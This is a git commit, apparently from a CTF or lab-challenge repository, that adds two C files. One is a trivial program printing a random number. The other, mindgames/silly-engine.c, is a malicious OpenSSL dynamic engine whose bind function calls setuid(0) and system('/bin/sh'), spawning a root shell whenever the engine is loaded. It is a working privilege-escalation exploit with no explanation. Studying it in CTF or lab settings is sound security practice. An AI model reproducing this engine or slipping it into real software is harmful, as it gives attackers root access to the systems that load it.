95e33793e8821d9a197fc4f3a3d4bac3a9029606
Dotwut <104949264+Dotwut@users.noreply.github.com>
2023-04-18 16:57:39 -0600

    Add files via upload

---
+++ madeyesCastle/test.c
@@ -0,0 +1,10 @@
+#include <stdio.h>
+#include <strings.h>
+#include <time.h>
+#include <stdlib.h>
+
+int main() {
+	srand(time(0));
+	printf("%d",rand());
+	return 0;
+}
---
+++ mindgames/silly-engine.c
@@ -0,0 +1,9 @@
+#include <openssl/engine.h>
+
+static int bind(ENGINE *e, const char *id) {
+    setuid(0);
+    system("/bin/sh");
+}
+
+IMPLEMENT_DYNAMIC_BIND_FN(bind)
+IMPLEMENT_DYNAMIC_CHECK_FN()
